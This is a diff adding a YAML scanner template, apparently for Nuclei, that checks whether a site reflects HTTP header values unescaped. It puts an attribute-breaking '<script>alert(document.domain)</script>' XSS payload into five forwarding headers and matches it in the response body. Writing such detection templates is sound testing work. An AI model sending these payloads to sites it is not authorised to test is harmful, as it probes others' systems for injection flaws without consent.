@@ -1,0 +1,33 @@
+id: reflect-xss-header
+
+info:
+  name: Reflected XSS from header
+  author: am0nt31r0
+  severity: medium
+  description: Attempt to detected reflected XSS in HTTP headers that may be reflected in the HTML provided.
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+  tags: xss
+
+requests:
+  - method: GET
+    headers:
+      X-Forwarded-Host: 'something"><script>alert(document.domain)</script>.domain.com'
+      X-Forwarded-For: 'something"><script>alert(document.domain)</script>.domain.com'
+      X-Forwarded-Server: 'something"><script>alert(document.domain)</script>.domain.com'
+      Forwarded: 'something"><script>alert(document.domain)</script>.domain.com'
+      Reflected: 'something"><script>alert(document.domain)</script>.domain.com'
+    path:
+      - "{{BaseURL}}/?reflected=1"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'something"><script>alert(document.domain)'
+      - type: status
+        status:
+          - 200
+
